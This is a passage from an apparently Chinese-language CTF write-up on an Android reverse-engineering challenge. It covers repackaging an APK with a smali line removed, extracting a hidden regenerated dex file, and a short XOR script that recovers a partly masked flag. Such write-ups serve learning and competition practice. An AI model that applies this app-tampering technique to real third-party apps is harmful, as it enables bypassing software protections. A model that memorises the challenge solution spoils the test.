里面有段代码会动态修改外部 dex 文件，往里面插入一些代码，重新计算头部的校验值，并且生成一个新的 dex 文件，释放到 `/sdcard/` 里的一个隐藏文件夹里。新文件名为 `dnsmanYUn12M.dex`，这个才是真正被调用到的 dex 文件。没理解错的话，整个流程用术语好像是叫作 热修复？  
那么如何得到新的 dex 文件呢。  
搞了很久，终于找到一条行得通的办法。  
由于 .so 被修改了头，直接运行 APK 会闪退，所以注释掉 `smali` 里 `loadlibrary` 这一行，重新打包 APK，这样就能不会闪退了。然后点击 Check 的按钮，让它生成新的 dex 文件，并且由于没有 `loadlibrary` 无法调用外部函数，触发闪退。  
这样就能从隐藏文件夹里提取出新的 `dnsmanYUn12M.vdex` 和 `dnsmanYUn12M.odex `文件。  
然后手工转成 `dnsmanYUn12M.dex` 文件，进一步分析。  
![](https://ctfwp.wetolink.com/2019ddctf/76.png)  
这才是真正的 dex 文件。套路真的深～  
写解密脚本，一个很简单的解密流程。  
```
enc='@n|ixihPIppqws'

flag=''
for i in range(len(enc)):
    flag+=chr(ord(enc[i])^(i+8))
print flag
```
终于得到 Flag。

Flag: `DDCTF{Hg******_Yabbcf}`

# 评论区
**请文明评论，禁止广告**
<img src="https://ctfwp.wetolink.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  

---

